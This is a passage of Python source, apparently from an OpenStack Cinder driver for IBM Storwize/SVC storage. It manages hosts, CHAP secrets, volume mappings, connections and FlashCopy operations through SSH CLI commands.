err)\n        search_text = '!%s!' % self.configuration.storwize_svc_volpool_name\n        if search_text not in out:\n            raise exception.InvalidInput(\n                reason=(_('pool %s doesn\\'t exist')\n                        % self.configuration.storwize_svc_volpool_name))\n\n        # Check if compression is supported\n        self._compression_enabled = False\n        try:\n            ssh_cmd = ['svcinfo', 'lslicense', '-delim', '!']\n            out, err = self._run_ssh(ssh_cmd)\n            license_lines = out.strip().split('\\n')\n            for license_line in license_lines:\n                name, foo, value = license_line.partition('!')\n                if name in ('license_compression_enclosures',\n                            'license_compression_capacity') and value != '0':\n                    self._compression_enabled = True\n                    break\n        except exception.ProcessExecutionError:\n            LOG.exception(_('Failed to get license information.'))\n\n        # Get the iSCSI and FC names of the Storwize/SVC nodes\n        ssh_cmd = ['svcinfo', 'lsnode', '-delim', '!']\n        out, err = self._run_ssh(ssh_cmd)\n        self._assert_ssh_return(len(out.strip()), 'do_setup',\n                                ssh_cmd, out, err)\n\n        nodes = out.strip().split('\\n')\n        self._assert_ssh_return(len(nodes),\n                                'do_setup', ssh_cmd, out, err)\n        header = nodes.pop(0)\n        for node_line in nodes:\n            try:\n                node_data = self._get_hdr_dic(header, node_line, '!')\n            except exception.VolumeBackendAPIException:\n                with excutils.save_and_reraise_exception():\n                    self._log_cli_output_error('do_setup',\n                                               ssh_cmd, out, err)\n            node = {}\n            try:\n                node['id'] = node_data['id']\n                node['name'] = node_data['name']\n                node['IO_group'] = node_data['IO_group_id']\n                node['iscsi_name'] = node_data['iscsi_name']\n                node['WWNN'] = node_data['WWNN']\n                node['status'] = node_data['status']\n                node['WWPN'] = []\n                node['ipv4'] = []\n                node['ipv6'] = []\n                node['enabled_protocols'] = []\n                if node['status'] == 'online':\n                    self._storage_nodes[node['id']] = node\n            except KeyError:\n                self._handle_keyerror('lsnode', header)\n\n        # Get the iSCSI IP addresses and WWPNs of the Storwize/SVC nodes\n        self._get_iscsi_ip_addrs()\n        self._get_fc_wwpns()\n\n        # For each node, check what connection modes it supports.  Delete any\n        # nodes that do not support any types (may be partially configured).\n        to_delete = []\n        for k, node in self._storage_nodes.iteritems():\n            if ((len(node['ipv4']) or len(node['ipv6']))\n                    and len(node['iscsi_name'])):\n                node['enabled_protocols'].append('iSCSI')\n                self._enabled_protocols.add('iSCSI')\n            if len(node['WWPN']):\n                node['enabled_protocols'].append('FC')\n                self._enabled_protocols.add('FC')\n            if not len(node['enabled_protocols']):\n                to_delete.append(k)\n\n        for delkey in to_delete:\n            del self._storage_nodes[delkey]\n\n        # Make sure we have at least one node configured\n        self._driver_assert(len(self._storage_nodes),\n                            _('do_setup: No configured nodes'))\n\n        LOG.debug(_('leave: do_setup'))\n\n    def _build_default_opts(self):\n        # Ignore capitalization\n        protocol = self.configuration.storwize_svc_connection_protocol\n        if protocol.lower() == 'fc':\n            protocol = 'FC'\n        elif protocol.lower() == 'iscsi':\n            protocol = 'iSCSI'\n\n        opt = {'rsize': self.configuration.storwize_svc_vol_rsize,\n               'warning': self.configuration.storwize_svc_vol_warning,\n               'autoexpand': self.configuration.storwize_svc_vol_autoexpand,\n               'grainsize': self.configuration.storwize_svc_vol_grainsize,\n               'compression': self.configuration.storwize_svc_vol_compression,\n               'easytier': self.configuration.storwize_svc_vol_easytier,\n               'protocol': protocol,\n               'multipath': self.configuration.storwize_svc_multipath_enabled}\n        return opt\n\n    def check_for_setup_error(self):\n        \"\"\"Ensure that the flags are set properly.\"\"\"\n        LOG.debug(_('enter: check_for_setup_error'))\n\n        required_flags = ['san_ip', 'san_ssh_port', 'san_login',\n                          'storwize_svc_volpool_name']\n        for flag in required_flags:\n            if not self.configuration.safe_get(flag):\n                raise exception.InvalidInput(reason=_('%s is not set') % flag)\n\n        # Ensure that either password or keyfile were set\n        if not (self.configuration.san_password or\n                self.configuration.san_private_key):\n            raise exception.InvalidInput(\n                reason=_('Password or SSH private key is required for '\n                         'authentication: set either san_password or '\n                         'san_private_key option'))\n\n        # Check that flashcopy_timeout is not more than 10 minutes\n        flashcopy_timeout = self.configuration.storwize_svc_flashcopy_timeout\n        if not (flashcopy_timeout > 0 and flashcopy_timeout <= 600):\n            raise exception.InvalidInput(\n                reason=_('Illegal value %d specified for '\n                         'storwize_svc_flashcopy_timeout: '\n                         'valid values are between 0 and 600')\n                % flashcopy_timeout)\n\n        opts = self._build_default_opts()\n        self._check_vdisk_opts(opts)\n\n        LOG.debug(_('leave: check_for_setup_error'))\n\n    \"\"\"=====================================================================\"\"\"\n    \"\"\" INITIALIZE/TERMINATE CONNECTIONS                                    \"\"\"\n    \"\"\"=====================================================================\"\"\"\n\n    def ensure_export(self, ctxt, volume):\n        \"\"\"Check that the volume exists on the storage.\n\n        The system does not \"export\" volumes as a Linux iSCSI target does,\n        and therefore we just check that the volume exists on the storage.\n        \"\"\"\n        volume_defined = self._is_vdisk_defined(volume['name'])\n        if not volume_defined:\n            LOG.error(_('ensure_export: Volume %s not found on storage')\n                      % volume['name'])\n\n    def create_export(self, ctxt, volume):\n        model_update = None\n        return model_update\n\n    def remove_export(self, ctxt, volume):\n        pass\n\n    def _add_chapsecret_to_host(self, host_name):\n        \"\"\"Generate and store a randomly-generated CHAP secret for the host.\"\"\"\n\n        chap_secret = utils.generate_password()\n        ssh_cmd = ['svctask', 'chhost', '-chapsecret', chap_secret, host_name]\n        out, err = self._run_ssh(ssh_cmd)\n        # No output should be returned from chhost\n        self._assert_ssh_return(len(out.strip()) == 0,\n                                '_add_chapsecret_to_host', ssh_cmd, out, err)\n        return chap_secret\n\n    def _get_chap_secret_for_host(self, host_name):\n        \"\"\"Return the CHAP secret for the given host.\"\"\"\n\n        LOG.debug(_('enter: _get_chap_secret_for_host: host name %s')\n                  % host_name)\n\n        ssh_cmd = ['svcinfo', 'lsiscsiauth', '-delim', '!']\n        out, err = self._run_ssh(ssh_cmd)\n\n        if not len(out.strip()):\n            return None\n\n        host_lines = out.strip().split('\\n')\n        self._assert_ssh_return(len(host_lines), '_get_chap_secret_for_host',\n                                ssh_cmd, out, err)\n\n        header = host_lines.pop(0).split('!')\n        self._assert_ssh_return('name' in header, '_get_chap_secret_for_host',\n                                ssh_cmd, out, err)\n        self._assert_ssh_return('iscsi_auth_method' in header,\n                                '_get_chap_secret_for_host', ssh_cmd, out, err)\n        self._assert_ssh_return('iscsi_chap_secret' in header,\n                                '_get_chap_secret_for_host', ssh_cmd, out, err)\n        name_index = header.index('name')\n        method_index = header.index('iscsi_auth_method')\n        secret_index = header.index('iscsi_chap_secret')\n\n        chap_secret = None\n        host_found = False\n        for line in host_lines:\n            info = line.split('!')\n            if info[name_index] == host_name:\n                host_found = True\n                if info[method_index] == 'chap':\n                    chap_secret = info[secret_index]\n\n        self._assert_ssh_return(host_found, '_get_chap_secret_for_host',\n                                ssh_cmd, out, err)\n\n        LOG.debug(_('leave: _get_chap_secret_for_host: host name '\n                    '%(host_name)s with secret %(chap_secret)s')\n                  % {'host_name': host_name, 'chap_secret': chap_secret})\n\n        return chap_secret\n\n    def _connector_to_hostname_prefix(self, connector):\n        \"\"\"Translate connector info to storage system host name.\n\n        Translate a host's name and IP to the prefix of its hostname on the\n        storage subsystem.  We create a host name host name from the host and\n        IP address, replacing any invalid characters (at most 55 characters),\n        and adding a random 8-character suffix to avoid collisions. The total\n        length should be at most 63 characters.\n\n        \"\"\"\n\n        host_name = connector['host']\n        if isinstance(host_name, unicode):\n            host_name = host_name.translate(self._unicode_host_name_filter)\n        elif isinstance(host_name, str):\n            host_name = host_name.translate(self._string_host_name_filter)\n        else:\n            msg = _('_create_host: Cannot clean host name. Host name '\n                    'is not unicode or string')\n            LOG.error(msg)\n            raise exception.NoValidHost(reason=msg)\n\n        host_name = str(host_name)\n        return host_name[:55]\n\n    def _find_host_from_wwpn(self, connector):\n        for wwpn in connector['wwpns']:\n            ssh_cmd = ['svcinfo', 'lsfabric', '-wwpn', wwpn, '-delim', '!']\n            out, err = self._run_ssh(ssh_cmd)\n\n            if not len(out.strip()):\n                # This WWPN is not in use\n                continue\n\n            host_lines = out.strip().split('\\n')\n            header = host_lines.pop(0).split('!')\n            self._assert_ssh_return('remote_wwpn' in header and\n                                    'name' in header,\n                                    '_find_host_from_wwpn',\n                                    ssh_cmd, out, err)\n            rmt_wwpn_idx = header.index('remote_wwpn')\n            name_idx = header.index('name')\n\n            wwpns = map(lambda x: x.split('!')[rmt_wwpn_idx], host_lines)\n\n            if wwpn in wwpns:\n                # All the wwpns will be the mapping for the same\n                # host from this WWPN-based query. Just pick\n                # the name from first line.\n                hostname = host_lines[0].split('!')[name_idx]\n                return hostname\n\n        # Didn't find a host\n        return None\n\n    def _find_host_exhaustive(self, connector, hosts):\n        for host in hosts:\n            ssh_cmd = ['svcinfo', 'lshost', '-delim', '!', host]\n            out, err = self._run_ssh(ssh_cmd)\n            self._assert_ssh_return(len(out.strip()),\n                                    '_find_host_exhaustive',\n                                    ssh_cmd, out, err)\n            for attr_line in out.split('\\n'):\n                # If '!' not found, return the string and two empty strings\n                attr_name, foo, attr_val = attr_line.partition('!')\n                if (attr_name == 'iscsi_name' and\n                        'initiator' in connector and\n                        attr_val == connector['initiator']):\n                    return host\n                elif (attr_name == 'WWPN' and\n                      'wwpns' in connector and\n                      attr_val.lower() in\n                      map(str.lower, map(str, connector['wwpns']))):\n                        return host\n        return None\n\n    def _get_host_from_connector(self, connector):\n        \"\"\"List the hosts defined in the storage.\n\n        Return the host name with the given connection info, or None if there\n        is no host fitting that information.\n\n        \"\"\"\n\n        prefix = self._connector_to_hostname_prefix(connector)\n        LOG.debug(_('enter: _get_host_from_connector: prefix %s') % prefix)\n\n        # Get list of host in the storage\n        ssh_cmd = ['svcinfo', 'lshost', '-delim', '!']\n        out, err = self._run_ssh(ssh_cmd)\n\n        if not len(out.strip()):\n            return None\n\n        # If we have FC information, we have a faster lookup option\n        hostname = None\n        if 'wwpns' in connector:\n            hostname = self._find_host_from_wwpn(connector)\n\n        # If we don't have a hostname yet, try the long way\n        if not hostname:\n            host_lines = out.strip().split('\\n')\n            self._assert_ssh_return(len(host_lines),\n                                    '_get_host_from_connector',\n                                    ssh_cmd, out, err)\n            header = host_lines.pop(0).split('!')\n            self._assert_ssh_return('name' in header,\n                                    '_get_host_from_connector',\n                                    ssh_cmd, out, err)\n            name_index = header.index('name')\n            hosts = map(lambda x: x.split('!')[name_index], host_lines)\n            hostname = self._find_host_exhaustive(connector, hosts)\n\n        LOG.debug(_('leave: _get_host_from_connector: host %s') % hostname)\n\n        return hostname\n\n    def _create_host(self, connector):\n        \"\"\"Create a new host on the storage system.\n\n        We create a host name and associate it with the given connection\n        information.\n\n        \"\"\"\n\n        LOG.debug(_('enter: _create_host: host %s') % connector['host'])\n\n        rand_id = str(random.randint(0, 99999999)).zfill(8)\n        host_name = '%s-%s' % (self._connector_to_hostname_prefix(connector),\n                               rand_id)\n\n        # Get all port information from the connector\n        ports = []\n        if 'initiator' in connector:\n            ports.append('-iscsiname %s' % connector['initiator'])\n        if 'wwpns' in connector:\n            for wwpn in connector['wwpns']:\n                ports.append('-hbawwpn %s' % wwpn)\n\n        # When creating a host, we need one port\n        self._driver_assert(len(ports), _('_create_host: No connector ports'))\n        port1 = ports.pop(0)\n        arg_name, arg_val = port1.split()\n        ssh_cmd = ['svctask', 'mkhost', '-force', arg_name, arg_val, '-name',\n                   '\"%s\"' % host_name]\n        out, err = self._run_ssh(ssh_cmd)\n        self._assert_ssh_return('successfully created' in out,\n                                '_create_host', ssh_cmd, out, err)\n\n        # Add any additional ports to the host\n        for port in ports:\n            arg_name, arg_val = port.split()\n            ssh_cmd = ['svctask', 'addhostport', '-force', arg_name, arg_val,\n                       host_name]\n            out, err = self._run_ssh(ssh_cmd)\n\n        LOG.debug(_('leave: _create_host: host %(host)s - %(host_name)s') %\n                  {'host': connector['host'], 'host_name': host_name})\n        return host_name\n\n    def _get_hostvdisk_mappings(self, host_name):\n        \"\"\"Return the defined storage mappings for a host.\"\"\"\n\n        return_data = {}\n        ssh_cmd = ['svcinfo', 'lshostvdiskmap', '-delim', '!', host_name]\n        out, err = self._run_ssh(ssh_cmd)\n\n        mappings = out.strip().split('\\n')\n        if len(mappings):\n            header = mappings.pop(0)\n            for mapping_line in mappings:\n                mapping_data = self._get_hdr_dic(header, mapping_line, '!')\n                return_data[mapping_data['vdisk_name']] = mapping_data\n\n        return return_data\n\n    def _map_vol_to_host(self, volume_name, host_name):\n        \"\"\"Create a mapping between a volume to a host.\"\"\"\n\n        LOG.debug(_('enter: _map_vol_to_host: volume %(volume_name)s to '\n                    'host %(host_name)s')\n                  % {'volume_name': volume_name, 'host_name': host_name})\n\n        # Check if this volume is already mapped to this host\n        mapping_data = self._get_hostvdisk_mappings(host_name)\n\n        mapped_flag = False\n        result_lun = '-1'\n        if volume_name in mapping_data:\n            mapped_flag = True\n            result_lun = mapping_data[volume_name]['SCSI_id']\n        else:\n            lun_used = [int(v['SCSI_id']) for v in mapping_data.values()]\n            lun_used.sort()\n            # Assume all luns are taken to this point, and then try to find\n            # an unused one\n            result_lun = str(len(lun_used))\n            for index, n in enumerate(lun_used):\n                if n > index:\n                    result_lun = str(index)\n                    break\n\n        # Volume is not mapped to host, create a new LUN\n        if not mapped_flag:\n            ssh_cmd = ['svctask', 'mkvdiskhostmap', '-host', host_name,\n                       '-scsi', result_lun, volume_name]\n            out, err = self._run_ssh(ssh_cmd, check_exit_code=False)\n            if err and err.startswith('CMMVC6071E'):\n                if not self.configuration.storwize_svc_multihostmap_enabled:\n                    LOG.error(_('storwize_svc_multihostmap_enabled is set '\n                                'to False, Not allow multi host mapping'))\n                    exception_msg = 'CMMVC6071E The VDisk-to-host mapping '\\\n                                    'was not created because the VDisk is '\\\n                                    'already mapped to a host.\\n\"'\n                    raise exception.CinderException(data=exception_msg)\n\n                for i in range(len(ssh_cmd)):\n                    if ssh_cmd[i] == 'mkvdiskhostmap':\n                        ssh_cmd.insert(i + 1, '-force')\n\n                # try to map one volume to multiple hosts\n                out, err = self._run_ssh(ssh_cmd)\n                LOG.warn(_('volume %s mapping to multi host') % volume_name)\n                self._assert_ssh_return('successfully created' in out,\n                                        '_map_vol_to_host', ssh_cmd, out, err)\n            else:\n                self._assert_ssh_return('successfully created' in out,\n                                        '_map_vol_to_host', ssh_cmd, out, err)\n        LOG.debug(_('leave: _map_vol_to_host: LUN %(result_lun)s, volume '\n                    '%(volume_name)s, host %(host_name)s') %\n                  {'result_lun': result_lun,\n                   'volume_name': volume_name,\n                   'host_name': host_name})\n        return result_lun\n\n    def _delete_host(self, host_name):\n        \"\"\"Delete a host on the storage system.\"\"\"\n\n        LOG.debug(_('enter: _delete_host: host %s ') % host_name)\n\n        ssh_cmd = ['svctask', 'rmhost', host_name]\n        out, err = self._run_ssh(ssh_cmd)\n        # No output should be returned from rmhost\n        self._assert_ssh_return(len(out.strip()) == 0,\n                                '_delete_host', ssh_cmd, out, err)\n\n        LOG.debug(_('leave: _delete_host: host %s ') % host_name)\n\n    def _get_conn_fc_wwpns(self, host_name):\n        wwpns = []\n        cmd = ['svcinfo', 'lsfabric', '-host', host_name]\n        generator = self._port_conf_generator(cmd)\n        header = next(generator, None)\n        if not header:\n            return wwpns\n\n        for port_data in generator:\n            try:\n                wwpns.append(port_data['local_wwpn'])\n            except KeyError as e:\n                self._handle_keyerror('lsfabric', header)\n\n        return wwpns\n\n    def validate_connector(self, connector):\n        \"\"\"Check connector for at least one enabled protocol (iSCSI/FC).\"\"\"\n        valid = False\n        if 'iSCSI' in self._enabled_protocols and 'initiator' in connector:\n            valid = True\n        if 'FC' in self._enabled_protocols and 'wwpns' in connector:\n            valid = True\n        if not valid:\n            err_msg = (_('The connector does not contain the required '\n                         'information.'))\n            LOG.error(err_msg)\n            raise exception.VolumeBackendAPIException(data=err_msg)\n\n    def initialize_connection(self, volume, connector):\n        \"\"\"Perform the necessary work so that an iSCSI/FC connection can\n        be made.\n\n        To be able to create an iSCSI/FC connection from a given host to a\n        volume, we must:\n        1. Translate the given iSCSI name or WWNN to a host name\n        2. Create new host on the storage system if it does not yet exist\n        3. Map the volume to the host if it is not already done\n        4. Return the connection information for relevant nodes (in the\n           proper I/O group)\n\n        \"\"\"\n\n        LOG.debug(_('enter: initialize_connection: volume %(vol)s with '\n                    'connector %(conn)s') % {'vol': str(volume),\n                                             'conn': str(connector)})\n\n        vol_opts = self._get_vdisk_params(volume['volume_type_id'])\n        host_name = connector['host']\n        volume_name = volume['name']\n\n        # Check if a host object is defined for this host name\n        host_name = self._get_host_from_connector(connector)\n        if host_name is None:\n            # Host does not exist - add a new host to Storwize/SVC\n            host_name = self._create_host(connector)\n            # Verify that create_new_host succeeded\n            self._driver_assert(\n                host_name is not None,\n                _('_create_host failed to return the host name.'))\n\n        if vol_opts['protocol'] == 'iSCSI':\n            chap_secret = self._get_chap_secret_for_host(host_name)\n            if chap_secret is None:\n                chap_secret = self._add_chapsecret_to_host(host_name)\n\n        volume_attributes = self._get_vdisk_attributes(volume_name)\n        lun_id = self._map_vol_to_host(volume_name, host_name)\n\n        self._driver_assert(volume_attributes is not None,\n                            _('initialize_connection: Failed to get attributes'\n                              ' for volume %s') % volume_name)\n\n        try:\n            preferred_node = volume_attributes['preferred_node_id']\n            IO_group = volume_attributes['IO_group_id']\n        except KeyError as e:\n                LOG.error(_('Did not find expected column name in '\n                            'lsvdisk: %s') % str(e))\n                exception_msg = (_('initialize_connection: Missing volume '\n                                   'attribute for volume %s') % volume_name)\n                raise exception.VolumeBackendAPIException(data=exception_msg)\n\n        try:\n            # Get preferred node and other nodes in I/O group\n            preferred_node_entry = None\n            io_group_nodes = []\n            for k, node in self._storage_nodes.iteritems():\n                if vol_opts['protocol'] not in node['enabled_protocols']:\n                    continue\n                if node['id'] == preferred_node:\n                    preferred_node_entry = node\n                if node['IO_group'] == IO_group:\n                    io_group_nodes.append(node)\n\n            if not len(io_group_nodes):\n                exception_msg = (_('initialize_connection: No node found in '\n                                   'I/O group %(gid)s for volume %(vol)s') %\n                                 {'gid': IO_group, 'vol': volume_name})\n                raise exception.VolumeBackendAPIException(data=exception_msg)\n\n            if not preferred_node_entry and not vol_opts['multipath']:\n                # Get 1st node in I/O group\n                preferred_node_entry = io_group_nodes[0]\n                LOG.warn(_('initialize_connection: Did not find a preferred '\n                           'node for volume %s') % volume_name)\n\n            properties = {}\n            properties['target_discovered'] = False\n            properties['target_lun'] = lun_id\n            properties['volume_id'] = volume['id']\n            if vol_opts['protocol'] == 'iSCSI':\n                type_str = 'iscsi'\n                # We take the first IP address for now. Ideally, OpenStack will\n                # support iSCSI multipath for improved performance.\n                if len(preferred_node_entry['ipv4']):\n                    ipaddr = preferred_node_entry['ipv4'][0]\n                else:\n                    ipaddr = preferred_node_entry['ipv6'][0]\n                properties['target_portal'] = '%s:%s' % (ipaddr, '3260')\n                properties['target_iqn'] = preferred_node_entry['iscsi_name']\n                properties['auth_method'] = 'CHAP'\n                properties['auth_username'] = connector['initiator']\n                properties['auth_password'] = chap_secret\n            else:\n                type_str = 'fibre_channel'\n                conn_wwpns = self._get_conn_fc_wwpns(host_name)\n                if not vol_opts['multipath']:\n                    if preferred_node_entry['WWPN'] in conn_wwpns:\n                        properties['target_wwn'] = preferred_node_entry['WWPN']\n                    else:\n                        properties['target_wwn'] = conn_wwpns[0]\n                else:\n                    properties['target_wwn'] = conn_wwpns\n        except Exception:\n            with excutils.save_and_reraise_exception():\n                self.terminate_connection(volume, connector)\n                LOG.error(_('initialize_connection: Failed to collect return '\n                            'properties for volume %(vol)s and connector '\n                            '%(conn)s.\\n') % {'vol': str(volume),\n                                              'conn': str(connector)})\n\n        LOG.debug(_('leave: initialize_connection:\\n volume: %(vol)s\\n '\n                    'connector %(conn)s\\n properties: %(prop)s')\n                  % {'vol': str(volume),\n                     'conn': str(connector),\n                     'prop': str(properties)})\n\n        return {'driver_volume_type': type_str, 'data': properties, }\n\n    def terminate_connection(self, volume, connector, **kwargs):\n        \"\"\"Cleanup after an iSCSI connection has been terminated.\n\n        When we clean up a terminated connection between a given connector\n        and volume, we:\n        1. Translate the given connector to a host name\n        2. Remove the volume-to-host mapping if it exists\n        3. Delete the host if it has no more mappings (hosts are created\n           automatically by this driver when mappings are created)\n        \"\"\"\n        LOG.debug(_('enter: terminate_connection: volume %(vol)s with '\n                    'connector %(conn)s') % {'vol': str(volume),\n                                             'conn': str(connector)})\n\n        vol_name = volume['name']\n        host_name = self._get_host_from_connector(connector)\n        # Verify that _get_host_from_connector returned the host.\n        # This should always succeed as we terminate an existing connection.\n        self._driver_assert(\n            host_name is not None,\n            _('_get_host_from_connector failed to return the host name '\n              'for connector'))\n\n        # Check if vdisk-host mapping exists, remove if it does\n        mapping_data = self._get_hostvdisk_mappings(host_name)\n        if vol_name in mapping_data:\n            ssh_cmd = ['svctask', 'rmvdiskhostmap', '-host', host_name,\n                       vol_name]\n            out, err = self._run_ssh(ssh_cmd)\n            # Verify CLI behaviour - no output is returned from\n            # rmvdiskhostmap\n            self._assert_ssh_return(len(out.strip()) == 0,\n                                    'terminate_connection', ssh_cmd, out, err)\n            del mapping_data[vol_name]\n        else:\n            LOG.error(_('terminate_connection: No mapping of volume '\n                        '%(vol_name)s to host %(host_name)s found') %\n                      {'vol_name': vol_name, 'host_name': host_name})\n\n        # If this host has no more mappings, delete it\n        if not mapping_data:\n            self._delete_host(host_name)\n\n        LOG.debug(_('leave: terminate_connection: volume %(vol)s with '\n                    'connector %(conn)s') % {'vol': str(volume),\n                                             'conn': str(connector)})\n\n    \"\"\"=====================================================================\"\"\"\n    \"\"\" VOLUMES/SNAPSHOTS                                                   \"\"\"\n    \"\"\"=====================================================================\"\"\"\n\n    def _get_vdisk_attributes(self, vdisk_name):\n        \"\"\"Return vdisk attributes, or None if vdisk does not exist\n\n        Exception is raised if the information from system can not be\n        parsed/matched to a single vdisk.\n        \"\"\"\n\n        ssh_cmd = ['svcinfo', 'lsvdisk', '-bytes', '-delim', '!', vdisk_name]\n        return self._execute_command_and_parse_attributes(ssh_cmd)\n\n    def _get_vdisk_fc_mappings(self, vdisk_name):\n        \"\"\"Return FlashCopy mappings that this vdisk is associated with.\"\"\"\n\n        ssh_cmd = ['svcinfo', 'lsvdiskfcmappings', '-nohdr', vdisk_name]\n        out, err = self._run_ssh(ssh_cmd)\n\n        mapping_ids = []\n        if (len(out.strip())):\n            lines = out.strip().split('\\n')\n            mapping_ids = [line.split()[0] for line in lines]\n        return mapping_ids\n\n    def _get_vdisk_params(self, type_id):\n        opts = self._build_default_opts()\n        if type_id:\n            ctxt = context.get_admin_context()\n            volume_type = volume_types.get_volume_type(ctxt, type_id)\n            specs = volume_type.get('extra_specs')\n            for k, value in specs.iteritems():\n                # Get the scope, if using scope format\n                key_split = k.split(':')\n                if len(key_split) == 1:\n                    scope = None\n                    key = key_split[0]\n                else:\n                    scope = key_split[0]\n                    key = key_split[1]\n\n                # We generally do not look at capabilities in the driver, but\n                # protocol is a special case where the user asks for a given\n                # protocol and we want both the scheduler and the driver to act\n                # on the value.\n                if scope == 'capabilities' and key == 'storage_protocol':\n                    scope = None\n                    key = 'protocol'\n                    words = value.split()\n                    self._driver_assert(words and\n                                        len(words) == 2 and\n                                        words[0] == '<in>',\n                                        _('protocol must be specified as '\n                                          '\\'<in> iSCSI\\' or \\'<in> FC\\''))\n                    del words[0]\n                    value = words[0]\n\n                # Anything keys that the driver should look at should have the\n                # 'drivers' scope.\n                if scope and scope != \"drivers\":\n                    continue\n\n                if key in opts:\n                    this_type = type(opts[key]).__name__\n                    if this_type == 'int':\n                        value = int(value)\n                    elif this_type == 'bool':\n                        value = strutils.bool_from_string(value)\n                    opts[key] = value\n\n        self._check_vdisk_opts(opts)\n        return opts\n\n    def _create_vdisk(self, name, size, units, opts):\n        \"\"\"Create a new vdisk.\"\"\"\n\n        LOG.debug(_('enter: _create_vdisk: vdisk %s ') % name)\n\n        model_update = None\n        easytier = 'on' if opts['easytier'] else 'off'\n\n        # Set space-efficient options\n        if opts['rsize'] == -1:\n            ssh_cmd_se_opt = []\n        else:\n            ssh_cmd_se_opt = ['-rsize', '%s%%' % str(opts['rsize']),\n                              '-autoexpand', '-warning',\n                              '%s%%' % str(opts['warning'])]\n            if not opts['autoexpand']:\n                ssh_cmd_se_opt.remove('-autoexpand')\n\n            if opts['compression']:\n                ssh_cmd_se_opt.append('-compressed')\n            else:\n                ssh_cmd_se_opt.extend(['-grainsize', str(opts['grainsize'])])\n\n        ssh_cmd = ['svctask', 'mkvdisk', '-name', name, '-mdiskgrp',\n                   self.configuration.storwize_svc_volpool_name,\n                   '-iogrp', '0', '-size', size, '-unit',\n                   units, '-easytier', easytier] + ssh_cmd_se_opt\n        out, err = self._run_ssh(ssh_cmd)\n        self._assert_ssh_return(len(out.strip()), '_create_vdisk',\n                                ssh_cmd, out, err)\n\n        # Ensure that the output is as expected\n        match_obj = re.search('Virtual Disk, id \\[([0-9]+)\\], '\n                              'successfully created', out)\n        # Make sure we got a \"successfully created\" message with vdisk id\n        self._driver_assert(\n            match_obj is not None,\n            _('_create_vdisk %(name)s - did not find '\n              'success message in CLI output.\\n '\n              'stdout: %(out)s\\n stderr: %(err)s')\n            % {'name': name, 'out': str(out), 'err': str(err)})\n\n        LOG.debug(_('leave: _create_vdisk: volume %s ') % name)\n\n    def _make_fc_map(self, source, target, full_copy):\n        fc_map_cli_cmd = ['svctask', 'mkfcmap', '-source', source, '-target',\n                          target, '-autodelete']\n        if not full_copy:\n            fc_map_cli_cmd.extend(['-copyrate', '0'])\n        out, err = self._run_ssh(fc_map_cli_cmd)\n        self._driver_assert(\n            len(out.strip()),\n            _('create FC mapping from %(source)s to %(target)s - '\n              'did not find success message in CLI output.\\n'\n              ' stdout: %(out)s\\n stderr: %(err)s\\n')\n            % {'source': source,\n               'target': target,\n               'out': str(out),\n               'err': str(err)})\n\n        # Ensure that the output is as expected\n        match_obj = re.search('FlashCopy Mapping, id \\[([0-9]+)\\], '\n                              'successfully created', out)\n        # Make sure we got a \"successfully created\" message with vdisk id\n        self._driver_assert(\n            match_obj is not None,\n            _('create FC mapping from %(source)s to %(target)s - '\n              'did not find success message in CLI output.\\n'\n              ' stdout: %(out)s\\n stderr: %(err)s\\n')\n            % {'source': source,\n               'target': target,\n               'out': str(out),\n               'err': str(err)})\n\n        try:\n            fc_map_id = match_obj.group(1)\n            self._driver_assert(\n                fc_map_id is not None,\n                _('create FC mapping from %(source)s to %(target)s - '\n                  'did not find mapping id in CLI output.\\n'\n                  ' stdout: %(out)s\\n stderr: %(err)s\\n')\n                % {'source': source,\n                   'target': target,\n                   'out': str(out),\n                   'err': str(err)})\n        except IndexError:\n            self._driver_assert(\n                False,\n                _('create FC mapping from %(source)s to %(target)s - '\n                  'did not find mapping id in CLI output.\\n'\n                  ' stdout: %(out)s\\n stderr: %(err)s\\n')\n                % {'source': source,\n                   'target': target,\n                   'out': str(out),\n                   'err': str(err)})\n        return fc_map_id\n\n    def _call_prepare_fc_map(self, fc_map_id, source, target):\n        try:\n            out, err = self._run_ssh(['svctask', 'prestartfcmap', fc_map_id])\n        except exception.ProcessExecutionError as e:\n            with excutils.save_and_reraise_exception():\n                LOG.error(_('_prepare_fc_map: Failed to prepare FlashCopy '\n                            'from %(source)s to %(target)s.\\n'\n                            'stdout: %(out)s\\n stderr: %(err)s')\n                          % {'source': source,\n                             'target': target,\n                             'out': e.stdout,\n                             'err': e.stderr})\n\n    def _prepare_fc_map(self, fc_map_id, source, target):\n        self._call_prepare_fc_map(fc_map_id, source, target)\n        mapping_ready = False\n        wait_time = 5\n        # Allow waiting of up to timeout (set as parameter)\n        timeout = self.configuration.storwize_svc_flashcopy_timeout\n        max_retries = (timeout / wait_time) + 1\n        for try_number in range(1, max_retries):\n            mapping_attrs = self._get_flashcopy_mapping_attributes(fc_map_id)\n            if (mapping_attrs is None or\n                    'status' not in mapping_attrs):\n                break\n            if mapping_attrs['status'] == 'prepared':\n                mapping_ready = True\n                break\n            elif mapping_attrs['status'] == 'stopped':\n                self._call_prepare_fc_map(fc_map_id, source, target)\n            elif mapping_attrs['status'] != 'preparing':\n                # Unexpected mapping status\n                exception_msg = (_('Unexecpted mapping status %(status)s '\n                                   'for mapping %(id)s. Attributes: '\n                                   '%(attr)s')\n                                 % {'status': mapping_attrs['status'],\n                                    'id': fc_map_id,\n                                    'attr': mapping_attrs})\n                raise exception.VolumeBackendAPIException(data=exception_msg)\n            # Need to wait for mapping to be prepared, wait a few seconds\n            time.sleep(wait_time)\n\n        if not mapping_ready:\n            exception_msg = (_('Mapping %(id)s prepare failed to complete '\n                               'within the allotted %(to)d seconds timeout. '\n                               'Terminating.')\n                             % {'id': fc_map_id,\n                                'to': timeout})\n            LOG.error(_('_prepare_fc_map: Failed to start FlashCopy '\n                        'from %(source)s to %(target)s with '\n                        'exception %(ex)s')\n                      % {'source': source,\n                         'target': target,\n                         'ex': exception_msg})\n            raise exception.InvalidSnapshot(\n                reason=_('_prepare_fc_map: %s') % exception_msg)\n\n    def _start_fc_map(self, fc_map_id, source, target):\n        try:\n            out, err = self._run_ssh(['svctask', 'startfcmap', fc_map_id])\n        except exception.ProcessExecutionError as e:\n            with excutils.save_and_reraise_exception():\n                LOG.error(_('_start_fc_map: Failed to start FlashCopy '\n                            'from %(source)s to %(target)s.\\n'\n                            'stdout: %(out)s\\n stderr: %(err)s')\n                          % {'source': source,\n                             'target': target,\n                             'out': e.stdout,\n                             'err': e.stderr})\n\n    def _run_flashcopy(self, source, target, full_copy=True):\n        \"\"\"Create a FlashCopy mapping from the source to the target.\"\"\"\n\n        LOG.debug(_('enter: _run_flashcopy: execute FlashCopy from source '\n                    '%(source)s to target %(target)s') %\n                  {'source': source, 